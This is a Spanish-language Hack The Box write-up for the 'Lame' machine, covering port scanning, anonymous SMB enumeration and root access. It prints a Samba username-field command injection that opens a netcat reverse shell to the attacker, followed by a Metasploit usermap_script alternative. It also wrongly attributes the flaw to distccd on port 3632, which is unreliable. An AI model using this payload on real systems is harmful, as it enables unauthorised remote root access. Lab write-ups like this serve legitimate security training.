---
title: Lame
description: Lame es una máquina Linux que solo necesita un exploit para obtener acceso root. Fue la primera máquina publicada en Hack The Box y, antes de ser retirada, solía ser la primera máquina que los nuevos usuarios enfrentaban.
date: 2024-07-17
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-lame/lame_logo.png
categories:
  - Hack The Box
  - Machines
tags:
  - linux
  - hack the box
  - os command injection
  - metasploit
  - ftp
  - ssh
  - smb
  - tcp
  - information gathering
  - vulnerability exploitation
  - privilege escalation

---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/lame:-$ ping -c 1 10.10.10.3
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=303 ms

--- 10.10.10.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 302.848/302.848/302.848/0.000 ms
```
```terminal
/home/kali/Documents/htb/machines/lame:-$ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG map1
Host: 10.10.10.3 ()     Status: Up
Host: 10.10.10.3 ()     Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3632/open/tcp//distccd///
```
```terminal
/home/kali/Documents/htb/machines/lame:-$ sudo nmap -sCV -p21,22,139,445,3632 -vvv -oN map2 10.10.10.3
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.92
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-07-16T11:08:59-04:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 7523/tcp): CLEAN (Timeout)
|   Check 3 (port 40169/udp): CLEAN (Timeout)
|   Check 4 (port 42500/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m26s, deviation: 2h49m45s, median: 23s
```
---
## Vulnerability Exploitation

Listo los recursos compartidos disponibles en el servidor SMB. No requiero credenciales.

```terminal
/home/kali/Documents/htb/machines/lame:-$ smbclient -L \\10.10.10.3
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```
Con Smbmap enumero los recursos compartidos, 'tmp' tiene permisos de lectura y escritura. Hay que ejecutar el comando varias veces, ya que puede no detectar el host.

```terminal
/home/kali/Documents/htb/machines/lame:-$ smbmap -H 10.10.10.3
```

![](/assets/img/htb-writeup-lame/lame2.png)

Accedo al recurso 'tmp' y listo el contenido.

```terminal
/home/kali/Documents/htb/machines/lame:-$ smbclient -N \\\\10.10.10.3\\tmp
```

![](/assets/img/htb-writeup-lame/lame3.png)

---
## Privilege Escalation

Utilizo Netcat y Smbclient para ejecutar código remoto y conseguir una shell con privilegios elevados.

La vulnerabilidad se encuentra en el servicio 'distccd' del puerto 3632.

```terminal
/home/kali/Documents/htb/machines/lame:-$ nc -lnvp 1234
	listening on [any] 1234 ...
```
```terminal
smb: \> logon "/=`nc 10.10.16.92 1234 -e /bin/sh`"
Password: 
session setup failed: NT_STATUS_IO_TIMEOUT

	... 10.10.10.3: inverse host lookup failed: Unknown host
	connect to [10.10.16.92] from (UNKNOWN) [10.10.10.3] 60063

whoami
root
```
Creo una shell interactiva con python.

```terminal
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/# export TERM=xterm

root@lame:/# cat /home/makis/user.txt

root@lame:/# cat /root/root.txt
```

### Alternativa con Metasploit. 

```terminal
/home/kali/Documents/htb/machines/lame:-$ msfconsole

msf6 > search samba 3.0.20
0  exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba "username map script"
Command Execution
	
msf6 > use 0
msf6 exploit(multi/samba/usermap_script) > show options

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
LHOST => 10.10.16.92
msf6 exploit(multi/samba/usermap_script) > exploit
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/1" target="_blank">Lame Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }